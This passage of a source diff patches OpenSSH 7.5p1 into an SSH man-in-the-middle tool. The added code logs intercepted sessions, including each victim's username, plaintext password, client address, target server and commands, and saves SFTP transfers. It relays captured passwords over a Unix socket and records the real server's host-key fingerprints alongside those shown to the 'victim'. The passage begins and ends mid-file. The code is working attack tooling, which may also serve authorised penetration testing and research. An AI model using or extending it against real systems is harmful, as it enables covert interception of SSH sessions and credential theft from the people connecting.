CHAN_SES_WINDOW_DEFAULT);\n+\t    1, is_tty, CHAN_SES_WINDOW_DEFAULT, s->session_log_fd, s->is_sftp);\n }\n \n /*\n@@ -2320,6 +2433,15 @@\n \t}\n \tsession_proctitle(s);\n \tsession_unused(s->self);\n+\tfree(s->session_log_dir); s->session_log_dir = NULL;\n+\tfree(s->session_log_filepath); s->session_log_filepath = NULL;\n+\tif (s->session_log_fd > -1) {\n+\t  if (s->is_sftp)\n+\t    write(s->session_log_fd, \"</pre></html>\", 13);\n+\t  fdatasync(s->session_log_fd);\n+\t  close(s->session_log_fd);\n+\t  s->session_log_fd = -1;\n+\t}\n }\n \n void\n@@ -2532,6 +2654,10 @@\n \tif (authctxt == NULL)\n \t\treturn;\n \n+\tif (authctxt->original_user != NULL) {\n+\t\tfree(authctxt->original_user);  authctxt->original_user = NULL;\n+\t}\n+\n #ifdef USE_PAM\n \tif (options.use_pam) {\n \t\tsshpam_cleanup();\n@@ -2578,3 +2704,263 @@\n \treturn remote;\n }\n \n+/* Returns a file handle for logging a shell/sftp session.  Set \"is_sftp\" arg\n+ * to 1 to make a log file for SFTP. */\n+void set_session_log(Session *s, unsigned int is_sftp, const char *command) {\n+  char filename[ sizeof(MITM_LOG) + 32 ] = MITM_LOG \"shell_session_0.txt\";\n+  int num_tries = 0;\n+\n+  s->is_sftp = is_sftp;\n+  if (s->is_sftp)\n+    strlcpy(filename, MITM_LOG \"sftp_session_0.html\", sizeof(filename));\n+\n+  s->session_log_fd = -1;\n+  while ((num_tries < MAX_LOG_OPEN_TRIES) && (s->session_log_fd < 0)) {\n+    s->session_log_fd = open(filename, O_CREAT | O_EXCL | O_NOATIME | O_NOFOLLOW | O_WRONLY\n+#ifdef SYNC_LOG\n+        | O_SYNC\n+#endif\n+        , S_IRUSR | S_IWUSR);\n+\n+    num_tries++;\n+\n+    /* If the file could not be created, increment the counter and append it\n+     * to the filename prefix so we can try again. */\n+    if (s->session_log_fd < 0) {\n+      if (s->is_sftp)\n+\tsnprintf(filename, sizeof(filename) - 1, MITM_LOG \"sftp_session_%d.html\", num_tries);\n+      else\n+\tsnprintf(filename, sizeof(filename) - 1, MITM_LOG \"shell_session_%d.txt\", num_tries);\n+    }\n+  }\n+\n+  if (s->session_log_fd < 0)\n+    logit(\"MITM: Could not open file for logging!\");\n+  else {\n+    struct ssh *ssh = active_state;\n+    time_t t = time(NULL);\n+    struct tm stm;\n+    int original_port = lol->original_port;\n+    char srcport[16];\n+    char dstport[16];\n+    char buf[128];\n+\n+    memset(&stm, 0, sizeof(struct tm));\n+    memset(srcport, 0, sizeof(srcport));\n+    memset(dstport, 0, sizeof(dstport));\n+    memset(buf, 0, sizeof(buf));\n+\n+\n+    s->session_log_filepath = xstrdup(filename);\n+\n+    /* Create a unique directory for SFTP sessions.  This is where uploaded and\n+     * downloaded files will go. */\n+    if (s->is_sftp) {\n+      filename[strlen(filename) - 5] = '/';\n+      filename[strlen(filename) - 4] = '\\0';\n+      if (mkdir(filename, S_IRWXU) == 0)\n+\ts->session_log_dir = xstrdup(filename);\n+\n+      write(s->session_log_fd, \"<html><pre>\", 11);\n+    }\n+\n+    snprintf(srcport, sizeof(srcport), \"%d\", ssh_remote_port(ssh));\n+    snprintf(dstport, sizeof(dstport), \"%d\", original_port);\n+    if (gmtime_r(&t, &stm) != NULL)\n+      strftime(buf, sizeof(buf), \"%F %T %Z\", &stm);\n+\n+    /* Write the timestamp. */\n+    write(s->session_log_fd, \"Time: \", 6);\n+    write(s->session_log_fd, buf, strlen(buf));\n+\n+    /* Write the hostname and destination port. */\n+    write(s->session_log_fd, \"\\nServer: \", 9);\n+    write(s->session_log_fd, lol->original_host, strlen(lol->original_host));\n+    write(s->session_log_fd, \":\", 1);\n+    write(s->session_log_fd, dstport, strlen(dstport));\n+\n+    /* Write the origin IP and source port. */\n+    write(s->session_log_fd, \"\\nClient: \", 9);\n+    write(s->session_log_fd, ssh_remote_ipaddr(ssh), strlen(ssh_remote_ipaddr(ssh)));\n+    write(s->session_log_fd, \":\", 1);\n+    write(s->session_log_fd, srcport, strlen(srcport));\n+\n+    /* Write the username. */\n+    write(s->session_log_fd, \"\\nUsername: \", 11);\n+    write(s->session_log_fd, lol->username, strlen(lol->username));\n+\n+    /* Write the password. */\n+    write(s->session_log_fd, \"\\nPassword: \", 11);\n+    write(s->session_log_fd, lol->password, strlen(lol->password));\n+\n+    /* Write the command, if there was one. */\n+    if (command != NULL) {\n+      write(s->session_log_fd, \"\\nCommand: \", 10);\n+      write(s->session_log_fd, command, strlen(command));\n+    }\n+    write(s->session_log_fd, \"\\n-------------------------\\n\", 27);\n+  }\n+}\n+\n+/* Requests to sleep a certain amount of time (must be less than 1 second).\n+ * Returns the number of seconds actually slept. */\n+/*\n+double my_sleep(struct timespec *sleep_request) {\n+  struct timespec sleep_remaining;\n+\n+  * If we slept the entire duration without being interrupted... *\n+  if (nanosleep(sleep_request, &sleep_remaining) == 0)\n+    return (double)(sleep_request->tv_nsec / 1000000000.0);\n+  else\n+    return (double)((sleep_request->tv_nsec - sleep_remaining.tv_nsec) / 1000000000.0);\n+}\n+*/\n+\n+/* Creates a unique socket and listens on it.  Returns its filename and sets\n+ * the \"sock_fd\" argument to the socket handle.  The caller must free() the\n+ * return value. */\n+char *create_password_and_fingerprint_socket(int *sock_fd) {\n+  char *password_and_fingerprint_socket_name = NULL;\n+  struct sockaddr_un addr;\n+  char socket_prefix[] = MITM_ROOT \"/tmp/socket_\";\n+  int counter = 0;\n+  int password_and_fingerprint_socket_name_len = sizeof(socket_prefix) + 5;\n+\n+  /* Create a new socket. */\n+  memset(&addr, 0, sizeof(addr));\n+  addr.sun_family = AF_UNIX;\n+  *sock_fd = socket(AF_UNIX, SOCK_STREAM, 0);\n+  if (*sock_fd == -1) {\n+    logit(\"MITM: Error: could not create socket for fingerprint data!\");\n+    return strdup(\"\");\n+  }\n+\n+  /* Allocate a return buffer to hold the socket filename. */\n+  if ((password_and_fingerprint_socket_name = calloc(password_and_fingerprint_socket_name_len, sizeof(char))) == NULL) {\n+    *sock_fd = -1;\n+    return strdup(\"\");\n+  }\n+\n+  /* Make a new, unique socket file path. */\n+  while (counter < 1024) {\n+    snprintf(password_and_fingerprint_socket_name, password_and_fingerprint_socket_name_len, \"%s%d\", socket_prefix, counter);\n+    strlcpy(addr.sun_path, password_and_fingerprint_socket_name , sizeof(addr.sun_path));\n+    if (bind(*sock_fd, (struct sockaddr *)&addr, sizeof(addr)) == 0)\n+      break;\n+\n+    counter++;\n+  }\n+\n+  /* Listen on the socket handle. */\n+  if (listen(*sock_fd, 1) == -1) {\n+    logit(\"MITM: Error while listening on socket for fingerprint data: %d\", errno);\n+    close(*sock_fd);\n+    *sock_fd = -1;\n+    free(password_and_fingerprint_socket_name); password_and_fingerprint_socket_name = NULL;\n+    return strdup(\"\");\n+  }\n+\n+  return password_and_fingerprint_socket_name;\n+}\n+\n+/* Writes the password, then reads the host key fingerprints from the client\n+ * program, sets the appropriate \"legit_*_fingerprint\" global variables,\n+ * deletes the socket, and frees the socket name. */\n+void write_password_and_read_fingerprints(char **password_and_fingerprint_socket_name, int sock_fd, struct ssh *ssh_active_state, Channel *c) {\n+  int client_fd = -1, written = 0, r = 0;\n+  u_int16_t password_len = htons((u_int16_t)strlen(lol->password));\n+  char *buffer = NULL;\n+\n+  /* Wait for the client to connect, then accept it. */\n+  client_fd = accept(sock_fd, NULL, NULL);\n+  if (client_fd < 0)\n+    fatal(\"MITM: Error while accepting socket client connection: %d\", errno);\n+\n+  /* Send the password length. */\n+  if (send(client_fd, &password_len, sizeof(password_len), 0) < 0)\n+    fatal(\"MITM: Error while sending password length: %d\", errno);\n+\n+  /* Write the password. */\n+  while (written < password_len) {\n+    r = send(client_fd, lol->password + written, password_len - written, 0);\n+    if ((r < 0) && (r != EINTR))\n+      fatal(\"MITM: Error while sending password: %d\", errno);\n+    else if (r > 0)\n+      written += r;\n+  }\n+\n+  buffer = calloc(SOCKET_PASSWORD_AND_FINGERPRINT_BUFFER_SIZE, sizeof(char));\n+  if ((buffer != NULL) && (c != NULL)) {\n+    int r, bytes_read = 0;\n+    char *saved_buffer = buffer;  /* We use strsep(), so save this pointer. */\n+    char *line = NULL;\n+    int line_len = 0;\n+    struct sshkey *k = NULL;\n+    char *fp = NULL;\n+\n+    /* Read everything into buffer. */\n+    while (1) {\n+      r = read(client_fd, buffer + bytes_read, SOCKET_PASSWORD_AND_FINGERPRINT_BUFFER_SIZE - bytes_read);\n+      if (r <= 0)\n+\tbreak;\n+      bytes_read += r;\n+    }\n+\n+    /* Tokenize the buffer by the newline character. */\n+    while ((line = strsep(&buffer, \"\\n\")) != NULL) {\n+      line_len = strlen(line);\n+      if (line_len > 4) {\n+\n+\t/* We should only get one MD5 and one SHA256 fingerprint.  If we get\n+\t * more, log it. */\n+\tif ((c->legit_md5_fingerprint_len > 0) && (c->legit_sha256_fingerprint_len > 0))\n+\t  logit(\"MITM: !! Somehow, both the MD5 and SHA256 fingerprints were already set, but we got another fingerprint line anyway!! Please contact the project maintainer about this! [%s]\", line);\n+\n+\t/* If this line begins with \"MD5:\", its an MD5 fingerprint.  Copy it\n+\t * into the \"legit_md5_fingerprint\" buffer. */\n+\tif (memcmp(line, \"MD5:\", 4) == 0) {\n+\t  c->legit_md5_fingerprint = strdup(line + 4);\n+\t  c->legit_md5_fingerprint_len = strlen(c->legit_md5_fingerprint);\n+\t/* If this is a SHA256 fingerprint, copy this as well. */\n+\t} else if (memcmp(line, \"SHA256:\", 7) == 0) {\n+\t  c->legit_sha256_fingerprint = strdup(line + 7);\n+\t  c->legit_sha256_fingerprint_len = strlen(c->legit_sha256_fingerprint);\n+\t} else\n+\t  logit(\"MITM: unknown fingerprint!: [%s]\", line);\n+      }\n+    }\n+\n+    c->extra_fp_bytes = calloc(EXTRA_FP_BYTES_SIZE, sizeof(char));\n+    k = ssh_active_state->kex->load_host_public_key(active_state->kex->hostkey_type, ssh_active_state->kex->hostkey_nid, ssh_active_state);\n+\n+    /* Set the host key fingerprints our sshd is using with the victim. */\n+    if (c->legit_md5_fingerprint_len > 0) {\n+      fp = sshkey_fingerprint(k, SSH_DIGEST_MD5, SSH_FP_DEFAULT);\n+      c->our_md5_fingerprint = strdup(fp + 4);  // Cut off the \"MD5:\" prefix.\n+      c->our_md5_fingerprint_len = strlen(c->our_md5_fingerprint);\n+      free(fp); fp = NULL;\n+ \n+      debug(\"MITM: MD5 fingerprint received from legit server: [%s]\", c->legit_md5_fingerprint);\n+      debug(\"MITM: MD5 fingerprint seen by victim: [%s]\", c->our_md5_fingerprint);\n+    }\n+\n+    if (c->legit_sha256_fingerprint_len > 0) {\n+      fp = sshkey_fingerprint(k, SSH_DIGEST_SHA256, SSH_FP_DEFAULT);\n+      c->our_sha256_fingerprint = strdup(fp + 7); // Cut off the \"SHA256:\" prefix.\n+      c->our_sha256_fingerprint_len = strlen(c->our_sha256_fingerprint);\n+      free(fp); fp = NULL;\n+      debug(\"MITM: SHA256 fingerprint received from legit server: [%s]\", c->legit_sha256_fingerprint);\n+      debug(\"MITM: SHA256 fingerprint seen by victim: [%s]\", c->our_sha256_fingerprint);\n+    }\n+\n+    /* Free the buffer we read data from the socket into. */\n+    free(saved_buffer); saved_buffer = NULL; buffer = NULL;\n+  }\n+\n+  /* We are done with this socket, so shut it down, delete the file, and\n+  * free the filename. */\n+  shutdown(client_fd, SHUT_RDWR);\n+  close(sock_fd);\n+  unlink(*password_and_fingerprint_socket_name);\n+  free(*password_and_fingerprint_socket_name); *password_and_fingerprint_socket_name = NULL;\n+}\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/session.h openssh-7.5p1-mitm/session.h\n--- openssh-7.5p1/session.h\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/session.h\t2019-09-08 01:47:49.762198860 +0000\n@@ -60,6 +60,10 @@\n \t\tchar\t*name;\n \t\tchar\t*val;\n \t} *env;\n+\tint     is_sftp;          /* Set to 1 if this is an SFTP session. */\n+\tchar    *session_log_dir; /* The directory to store SFTP files in. */\n+\tchar    *session_log_filepath; /* The file path of the session log. */\n+\tint     session_log_fd;   /* A descriptor to this session's log file. */\n };\n \n void\t do_authenticated(Authctxt *);\ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp.c openssh-7.5p1-mitm/sftp.c\n--- openssh-7.5p1/sftp.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sftp.c\t2019-09-08 01:47:49.770198481 +0000\n@@ -579,9 +579,10 @@\n remote_is_dir(struct sftp_conn *conn, const char *path)\n {\n \tAttrib *a;\n+\tu_int status;\n \n \t/* XXX: report errors? */\n-\tif ((a = do_stat(conn, path, 1)) == NULL)\n+\tif ((a = do_stat(conn, path, 1, &status)) == NULL)\n \t\treturn(0);\n \tif (!(a->flags & SSH2_FILEXFER_ATTR_PERMISSIONS))\n \t\treturn(0);\n@@ -1431,6 +1432,7 @@\n \tchar path_buf[PATH_MAX];\n \tint err = 0;\n \tglob_t g;\n+\tu_int status;\n \n \tpath1 = path2 = NULL;\n \tcmdnum = parse_args(&cmd, &ignore_errors, &aflag, &fflag, &hflag,\n@@ -1500,11 +1502,12 @@\n \t\tbreak;\n \tcase I_CHDIR:\n \t\tpath1 = make_absolute(path1, *pwd);\n-\t\tif ((tmp = do_realpath(conn, path1)) == NULL) {\n+\t\tif ((tmp = do_realpath(conn, path1, &status)) == NULL) {\n \t\t\terr = 1;\n \t\t\tbreak;\n \t\t}\n-\t\tif ((aa = do_stat(conn, tmp, 0)) == NULL) {\n+\t\tu_int status;\n+\t\tif ((aa = do_stat(conn, tmp, 0, &status)) == NULL) {\n \t\t\tfree(tmp);\n \t\t\terr = 1;\n \t\t\tbreak;\n@@ -1593,7 +1596,8 @@\n \t\tpath1 = make_absolute(path1, *pwd);\n \t\tremote_glob(conn, path1, GLOB_NOCHECK, NULL, &g);\n \t\tfor (i = 0; g.gl_pathv[i] && !interrupted; i++) {\n-\t\t\tif (!(aa = do_stat(conn, g.gl_pathv[i], 0))) {\n+\t\t\tu_int status;\n+\t\t\tif (!(aa = do_stat(conn, g.gl_pathv[i], 0, &status))) {\n \t\t\t\tif (err_abort) {\n \t\t\t\t\terr = -1;\n \t\t\t\t\tbreak;\n@@ -2041,6 +2045,7 @@\n \tchar cmd[2048];\n \tint err, interactive;\n \tEditLine *el = NULL;\n+\tu_int status;\n #ifdef USE_LIBEDIT\n \tHistory *hl = NULL;\n \tHistEvent hev;\n@@ -2078,7 +2083,7 @@\n \t}\n #endif /* USE_LIBEDIT */\n \n-\tremote_path = do_realpath(conn, \".\");\n+\tremote_path = do_realpath(conn, \".\", &status);\n \tif (remote_path == NULL)\n \t\tfatal(\"Need cwd\");\n \ndiff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/sftp-client.c openssh-7.5p1-mitm/sftp-client.c\n--- openssh-7.5p1/sftp-client.c\t2017-03-20 02:39:27.000000000 +0000\n+++ openssh-7.5p1-mitm/sftp-client.c\t2019-09-08 01:47:49.770198481 +0000\n@@ -74,6 +74,7 @@\n # define SFTP_DIRECTORY_CHARS      \"/\"\n #endif /* HAVE_CYGWIN */\n \n+/*\n struct sftp_conn {\n \tint fd_in;\n \tint fd_out;\n@@ -90,10 +91,13 @@\n \tu_int64_t limit_kbps;\n \tstruct bwlimit bwlimit_in, bwlimit_out;\n };\n+*/\n+struct sftp_conn *client_conn = NULL;\n+\n \n static u_char *\n-get_handle(struct sftp_conn *conn, u_int expected_id, size_t *len,\n-    const char *errfmt, ...) __attribute__((format(printf, 4, 5)));\n+get_handle(struct sftp_conn *conn, u_int expected_id, u_int *status, size_t *len,\n+    const char *errfmt, ...) __attribute__((format(printf, 5, 6)));\n \n /* ARGSUSED */\n static int\n@@ -231,11 +235,11 @@\n }\n \n static u_char *\n-get_handle(struct sftp_conn *conn, u_int expected_id, size_t *len,\n+get_handle(struct sftp_conn *conn, u_int expected_id, u_int *status, size_t *len,\n     const char *errfmt, ...)\n {\n \tstruct sshbuf *msg;\n-\tu_int id, status;\n+\tu_int id;\n \tu_char type;\n \tu_char *handle;\n \tchar errmsg[256];\n@@ -258,10 +262,10 @@\n \t\tfatal(\"%s: ID mismatch (%u != %u)\",\n \t\t    errfmt == NULL ? __func__ : errmsg, id, expected_id);\n \tif (type == SSH2_FXP_STATUS) {\n-\t\tif ((r = sshbuf_get_u32(msg, &status)) != 0)\n+\t\tif ((r = sshbuf_get_u32(msg, status)) != 0)\n \t\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n \t\tif (errfmt != NULL)\n-\t\t\terror(\"%s: %s\", errmsg, fx2txt(status));\n+\t\t\terror(\"%s: %s\", errmsg, fx2txt(*status));\n \t\tsshbuf_free(msg);\n \t\treturn(NULL);\n \t} else if (type != SSH2_FXP_HANDLE)\n@@ -276,7 +280,7 @@\n }\n \n static Attrib *\n-get_decode_stat(struct sftp_conn *conn, u_int expected_id, int quiet)\n+get_decode_stat(struct sftp_conn *conn, u_int expected_id, int quiet, u_int *status)\n {\n \tstruct sshbuf *msg;\n \tu_int id;\n@@ -296,14 +300,13 @@\n \tif (id != expected_id)\n \t\tfatal(\"ID mismatch (%u != %u)\", id, expected_id);\n \tif (type == SSH2_FXP_STATUS) {\n-\t\tu_int status;\n \n-\t\tif ((r = sshbuf_get_u32(msg, &status)) != 0)\n+\t\tif ((r = sshbuf_get_u32(msg, status)) != 0)\n \t\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n \t\tif (quiet)\n-\t\t\tdebug(\"Couldn't stat remote file: %s\", fx2txt(status));\n+\t\t\tdebug(\"Couldn't stat remote file: %s\", fx2txt(*status));\n \t\telse\n-\t\t\terror(\"Couldn't stat remote file: %s\", fx2txt(status));\n+\t\t\terror(\"Couldn't stat remote file: %s\", fx2txt(*status));\n \t\tsshbuf_free(msg);\n \t\treturn(NULL);\n \t} else if (type != SSH2_FXP_ATTRS) {\n@@ -322,7 +325,7 @@\n \n static int\n get_decode_statvfs(struct sftp_conn *conn, struct sftp_statvfs *st,\n-    u_int expected_id, int quiet)\n+    u_int expected_id, int quiet, u_int *status)\n {\n \tstruct sshbuf *msg;\n \tu_char type;\n@@ -342,14 +345,12 @@\n \tif (id != expected_id)\n \t\tfatal(\"ID mismatch (%u != %u)\", id, expected_id);\n \tif (type == SSH2_FXP_STATUS) {\n-\t\tu_int status;\n-\n-\t\tif ((r = sshbuf_get_u32(msg, &status)) != 0)\n+\t\tif ((r = sshbuf_get_u32(msg, status)) != 0)\n \t\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n \t\tif (quiet)\n-\t\t\tdebug(\"Couldn't statvfs: %s\", fx2txt(status));\n+\t\t\tdebug(\"Couldn't statvfs: %s\", fx2txt(*status));\n \t\telse\n-\t\t\terror(\"Couldn't statvfs: %s\", fx2txt(status));\n+\t\t\terror(\"Couldn't statvfs: %s\", fx2txt(*status));\n \t\tsshbuf_free(msg);\n \t\treturn -1;\n \t} else if (type != SSH2_FXP_EXTENDED_REPLY) {\n@@ -523,7 +524,7 @@\n \tu_int count, id, i, expected_id, ents = 0;\n \tsize_t handle_len;\n \tu_char type, *handle;\n-\tint status = SSH2_FX_FAILURE;\n+\tint status = SSH2_FX_FAILURE, status_ret;\n \tint r;\n \n \tif (dir)\n@@ -539,7 +540,7 @@\n \t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n \tsend_msg(conn, msg);\n \n-\thandle = get_handle(conn, id, &handle_len,\n+\thandle = get_handle(conn, id, &status_ret, &handle_len,\n \t    \"remote readdir(\\\"%s\\\")\", path);\n \tif (handle == NULL) {\n \t\tsshbuf_free(msg);\n@@ -730,7 +731,7 @@\n }\n \n Attrib *\n-do_stat(struct sftp_conn *conn, const char *path, int quiet)\n+do_stat(struct sftp_conn *conn, const char *path, int quiet, u_int *status)\n {\n \tu_int id;\n \n@@ -740,11 +741,11 @@\n \t    conn->version == 0 ? SSH2_FXP_STAT_VERSION_0 : SSH2_FXP_STAT,\n \t    path, strlen(path));\n \n-\treturn(get_decode_stat(conn, id, quiet));\n+\treturn(get_decode_stat(conn, id, quiet, status));\n }\n \n Attrib *\n-do_lstat(struct sftp_conn *conn, const char *path, int quiet)\n+do_lstat(struct sftp_conn *conn, const char *path, int quiet, u_int *status)\n {\n \tu_int id;\n \n@@ -753,20 +754,20 @@\n \t\t\tdebug(\"Server version does not support lstat operation\");\n \t\telse\n \t\t\tlogit(\"Server version does not support lstat operation\");\n-\t\treturn(do_stat(conn, path, quiet));\n+\t\treturn(do_stat(conn, path, quiet, status));\n \t}\n \n \tid = conn->msg_id++;\n \tsend_string_request(conn, id, SSH2_FXP_LSTAT, path,\n \t    strlen(path));\n \n-\treturn(get_decode_stat(conn, id, quiet));\n+\treturn(get_decode_stat(conn, id, quiet, status));\n }\n \n #ifdef notyet\n Attrib *\n do_fstat(struct sftp_conn *conn, const u_char *handle, u_int handle_len,\n-    int quiet)\n+    int quiet, u_int *status)\n {\n \tu_int id;\n \n@@ -774,7 +775,7 @@\n \tsend_string_request(conn, id, SSH2_FXP_FSTAT, handle,\n \t    handle_len);\n \n-\treturn(get_decode_stat(conn, id, quiet));\n+\treturn(get_decode_stat(conn, id, quiet, status));\n }\n #endif\n \n@@ -813,7 +814,7 @@\n }\n \n char *\n-do_realpath(struct sftp_conn *conn, const char *path)\n+do_realpath(struct sftp_conn *conn, const char *path, u_int *status)\n {\n \tstruct sshbuf *msg;\n \tu_int expected_id, count, id;\n@@ -838,11 +839,9 @@\n \t\tfatal(\"ID mismatch (%u != %u)\", id, expected_id);\n \n \tif (type == SSH2_FXP_STATUS) {\n-\t\tu_int status;\n-\n-\t\tif ((r = sshbuf_get_u32(msg, &status)) != 0)\n+\t\tif ((r = sshbuf_get_u32(msg, status)) != 0)\n \t\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n-\t\terror(\"Couldn't canonicalize: %s\", fx2txt(status));\n+\t\terror(\"Couldn't canonicalize: %s\", fx2txt(*status));\n \t\tsshbuf_free(msg);\n \t\treturn NULL;\n \t} else if (type != SSH2_FXP_NAME)\n@@ -865,7 +864,7 @@\n \tfree(longname);\n \n \tsshbuf_free(msg);\n-\n+\t*status = SSH2_FX_OK;\n \treturn(filename);\n }\n \n@@ -1076,6 +1075,7 @@\n \tstruct sshbuf *msg;\n \tu_int id;\n \tint r;\n+\tu_int status;\n \n \tif ((conn->exts & SFTP_EXT_STATVFS) == 0) {\n \t\terror(\"Server does not support statvfs@openssh.com extension\");\n@@ -1095,7 +1095,7 @@\n \tsend_msg(conn, msg);\n \tsshbuf_free(msg);\n \n-\treturn get_decode_statvfs(conn, st, id, quiet);\n+\treturn get_decode_statvfs(conn, st, id, quiet, &status);\n }\n \n #ifdef notyet\n@@ -1105,6 +1105,7 @@\n {\n \tstruct sshbuf *msg;\n \tu_int id;\n+\tu_int status;\n \n \tif ((conn->exts & SFTP_EXT_FSTATVFS) == 0) {\n \t\terror(\"Server does not support fstatvfs@openssh.com extension\");\n@@ -1124,7 +1125,7 @@\n \tsend_msg(conn, msg);\n \tsshbuf_free(msg);\n \n-\treturn get_decode_statvfs(conn, st, id, quiet);\n+\treturn get_decode_statvfs(conn, st, id, quiet, &status);\n }\n #endif\n \n@@ -1172,10 +1173,11 @@\n \tTAILQ_HEAD(reqhead, request) requests;\n \tstruct request *req;\n \tu_char type;\n+\tu_int status_ret;\n \n \tTAILQ_INIT(&requests);\n \n-\tif (a == NULL && (a = do_stat(conn, remote_path, 0)) == NULL)\n+\tif (a == NULL && (a = do_stat(conn, remote_path, 0, &status_ret)) == NULL)\n \t\treturn -1;\n \n \t/* Do not preserve set[ug]id here, as we do not preserve ownership */\n@@ -1212,7 +1214,7 @@\n \tsend_msg(conn, msg);\n \tdebug3(\"Sent message SSH2_FXP_OPEN I:%u P:%s\", id, remote_path);\n \n-\thandle = get_handle(conn, id, &handle_len,\n+\thandle = get_handle(conn, id, &status_ret, &handle_len,\n \t    \"remote open(\\\"%s\\\")\", remote_path);\n \tif (handle == NULL) {\n \t\tsshbuf_free(msg);\n@@ -1453,6 +1455,7 @@\n \tSFTP_DIRENT **dir_entries;\n \tchar *filename, *new_src, *new_dst;\n \tmode_t mode = 0777;\n+\tu_int status_ret;\n \n \tif (depth >= MAX_DIR_DEPTH) {\n \t\terror(\"Maximum directory depth exceeded: %d levels\", depth);\n@@ -1460,7 +1463,7 @@\n \t}\n \n \tif (dirattrib == NULL &&\n-\t    (dirattrib = do_stat(conn, src, 1)) == NULL) {\n+\t    (dirattrib = do_stat(conn, src, 1, &status_ret)) == NULL) {\n \t\terror(\"Unable to stat remote directory \\\"%s\\\"\", src);\n \t\treturn -1;\n \t}\n@@ -1543,8 +1546,9 @@\n {\n \tchar *src_canon;\n \tint ret;\n+\tu_int status;\n \n-\tif ((src_canon = do_realpath(conn, src)) == NULL) {\n+\tif ((src_canon = do_realpath(conn, src, &status)) == NULL) {\n \t\terror(\"Unable to canonicalize path \\\"%s\\\"\", src);\n \t\treturn -1;\n \t}\n@@ -1579,6 +1583,7 @@\n \tTAILQ_HEAD(ackhead, outstanding_ack) acks;\n \tstruct outstanding_ack *ack = NULL;\n \tsize_t handle_len;\n+\tint status_ret;\n \n \tTAILQ_INIT(&acks);\n \n@@ -1607,8 +1612,9 @@\n \t\ta.flags &= ~SSH2_FILEXFER_ATTR_ACMODTIME;\n \n \tif (resume) {\n+\t  u_int status_ret2;\n \t\t/* Get remote file size if it exists */\n-\t\tif ((c = do_stat(conn, remote_path, 0)) == NULL) {\n+\t\tif ((c = do_stat(conn, remote_path, 0, &status_ret2)) == NULL) {\n \t\t\tclose(local_fd);\n \t\t\treturn -1;\n \t\t}\n@@ -1643,7 +1649,7 @@\n \n \tsshbuf_reset(msg);\n \n-\thandle = get_handle(conn, id, &handle_len,\n+\thandle = get_handle(conn, id, &status_ret, &handle_len,\n \t    \"remote open(\\\"%s\\\")\", remote_path);\n \tif (handle == NULL) {\n \t\tclose(local_fd);\n@@ -1818,7 +1824,8 @@\n \t * the path already existed and is a directory.\n \t */\n \tif (do_mkdir(conn, dst, &a, 0) != 0) {\n-\t\tif ((dirattrib = do_stat(conn, dst, 0)) == NULL)\n+\t\tu_int status_ret;\n+\t\tif ((dirattrib = do_stat(conn, dst, 0, &status_ret)) == NULL)\n \t\t\treturn -1;\n \t\tif (!S_ISDIR(dirattrib->perm)) {\n \t\t\terror(\"\\\"%s\\\" exists but is not a directory\", dst);\n@@ -1876,8 +1883,9 @@\n {\n \tchar *dst_canon;\n \tint ret;\n+\tu_int status;\n \n-\tif ((dst_canon = do_realpath(conn, dst)) == NULL) {\n+\tif ((dst_canon = do_realpath(conn, dst, &status)) == NULL) {\n \t\terror(\"Unable to canonicalize path \\\"%s\\\"\", dst);\n \t\treturn -1;\n \t}\n@@ -1904,3 +1912,534 @@\n \treturn(ret);\n }\n \n+/* Returns the directory handle, which must be free()'ed by the caller. */\n+u_char *\n+mitm_do_opendir(struct sftp_conn *conn, const char *path, size_t *handle_len, int *status)\n+{\n+\tstruct sshbuf *msg;\n+\tu_int id;\n+\tu_char *handle;\n+\tint r;\n+\n+\tid = conn->msg_id++;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_OPENDIR)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_cstring(msg, path)) != 0)\n+\t\tfatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\tsend_msg(conn, msg);\n+\n+\thandle = get_handle(conn, id, status, handle_len,\n+\t    \"remote opendir(\\\"%s\\\")\", path);\n+\tsshbuf_free(msg); msg = NULL;\n+\treturn handle;\n+}\n+\n+Stat *\n+mitm_do_readdir(struct sftp_conn *conn, u_int32_t id, u_char *handle_str, size_t handle_len, u_int *count, int *status) {\n+\tstruct sshbuf *msg;\n+\tStat *ret;\n+\tint r;\n+\tu_char type;\n+\tu_int i;\n+\n+\tif ((msg = sshbuf_new()) == NULL)\n+\t\tfatal(\"%s: sshbuf_new failed\", __func__);\n+\n+\tif ((r = sshbuf_put_u8(msg, SSH2_FXP_READDIR)) != 0 ||\n+\t    (r = sshbuf_put_u32(msg, id)) != 0 ||\n+\t    (r = sshbuf_put_string(msg, handle_str, handle_len)) != 0)\n+\t  fatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tsend_msg(conn, msg);\n+\tsshbuf_reset(msg);\n+\tget_msg(conn, msg);\n+\tif ((r = sshbuf_get_u8(msg, &type)) != 0 ||\n+\t    (r = sshbuf_get_u32(msg, &id)) != 0)\n+\t  fatal(\"%s: buffer error: %s\", __func__, ssh_err(r));\n+\n+\tdebug3(\"Received reply T:%u I:%u\", type, id);\n+\t\n+\tif (type == SSH2_FXP_STATUS) {\n+\t  u_int rstatus;\n+\t  \n+\t  if ((r = sshbuf_get_u32(msg, &rstatus)) != 0)\n+\t    fatal(\"%s: buffer error: %s\",\n+\t\t  __func__, ssh_err(r));\n+\t  debug3(\"Received SSH2_FXP_STATUS %d\", rstatus);\n+\n+\t  sshbuf_free(msg); msg = 